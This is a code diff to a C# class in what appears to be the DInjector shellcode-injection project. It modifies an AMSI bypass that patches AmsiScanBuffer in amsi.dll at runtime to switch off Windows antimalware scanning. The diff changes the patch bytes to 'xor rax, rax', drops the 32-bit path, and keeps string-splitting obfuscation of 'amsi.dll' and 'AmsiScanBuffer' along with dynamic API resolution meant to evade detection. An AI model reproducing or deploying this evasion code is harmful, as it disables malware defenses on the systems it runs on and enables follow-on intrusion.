@@ -8,8 +8,8 @@ namespace DInjector
 {
     class AM51
     {
-        private static readonly byte[] x64 = new byte[] {0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3};
-        private static readonly byte[] x86 = new byte[] {0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00};
+        // xor rax, rax
+        private static readonly byte[] x64 = new byte[] {0x48, 0x31, 0xC0};
 
         [UnmanagedFunctionPointer(CallingConvention.StdCall)]
         delegate IntPtr LoadLibraryA(
@@ -30,22 +30,7 @@ namespace DInjector
 
         public static void Patch()
         {
-            if (Is64Bit())
-            {
-                ChangeBytes(x64);
-            }
-            else
-            {
-                ChangeBytes(x86);
-            }
-        }
-
-        private static bool Is64Bit()
-        {
-            if (IntPtr.Size == 4)
-                return false;
-
-            return true;
+            ChangeBytes(x64);
         }
 
         private static void ChangeBytes(byte[] patch)
@@ -58,10 +43,10 @@ namespace DInjector
                 IntPtr pkernel32 = DI.DynamicInvoke.Generic.GetPebLdrModuleEntry("kernel32.dll");
 
                 // Library to load
-                var aston  = "am";
-                var martin = "si";
-                var dll    = ".dll";
-                object[] LoadLibParams = {aston+martin+dll};
+                var am = "am";
+                var si = "si";
+                var dll = ".dll";
+                object[] LoadLibParams = {am + si + dll};
 
                 // Get LoadLibraryA address
                 IntPtr pointer = DI.DynamicInvoke.Generic.GetExportAddress(pkernel32, "LoadLibraryA");
@@ -70,10 +55,10 @@ namespace DInjector
                 var lib = (IntPtr)DI.DynamicInvoke.Generic.DynamicFunctionInvoke(pointer, typeof(LoadLibraryA), ref LoadLibParams);
 
                 // Function to patch
-                var Aston  = "Am";
-                var Martin = "siScan";
+                var Am = "Am";
+                var siScan = "siScan";
                 var Buffer = "Buffer";
-                object[] GetProcAddressParams = {lib, Aston+Martin+Buffer};
+                object[] GetProcAddressParams = {lib, Am + siScan + Buffer};
 
                 // Get GetProcAddress address
                 pointer = DI.DynamicInvoke.Generic.GetExportAddress(pkernel32, "GetProcAddress");
